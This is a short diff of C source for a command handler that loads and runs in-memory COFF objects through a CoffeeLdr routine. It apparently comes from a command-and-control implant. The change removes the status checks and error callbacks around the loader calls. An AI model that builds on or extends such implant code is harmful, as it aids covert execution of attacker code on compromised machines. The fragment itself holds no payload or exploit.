@@ -1071,7 +1071,6 @@ VOID CommandInlineExecute( PPARSER Parser )
     DWORD FunctionNameSize = 0;
     DWORD ObjectDataSize   = 0;
     DWORD ArgSize          = 0;
-    DWORD Status           = 0;
     PCHAR FunctionName     = ParserGetBytes( Parser, &FunctionNameSize );
     PCHAR ObjectData       = ParserGetBytes( Parser, &ObjectDataSize );
     PCHAR ArgBuffer        = ParserGetBytes( Parser, &ArgSize );
@@ -1087,11 +1086,7 @@ VOID CommandInlineExecute( PPARSER Parser )
         case 0:
         {
             PUTS( "Use Non-Threaded CoffeeLdr" )
-            Status = CoffeeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize );
-            if ( Status )
-            {
-                PackageTransmitError( CALLBACK_ERROR_COFFEXEC, Status );
-            }
+            CoffeeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize );
             break;
         }
 
@@ -1114,11 +1109,7 @@ VOID CommandInlineExecute( PPARSER Parser )
             else
             {
                 PUTS( "Config is set to non-threaded" )
-                Status = CoffeeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize );
-                if ( Status )
-                {
-                    PackageTransmitError( CALLBACK_ERROR_COFFEXEC, Status );
-                }
+                CoffeeLdr( FunctionName, ObjectData, ArgBuffer, ArgSize );
             }
 
             break;
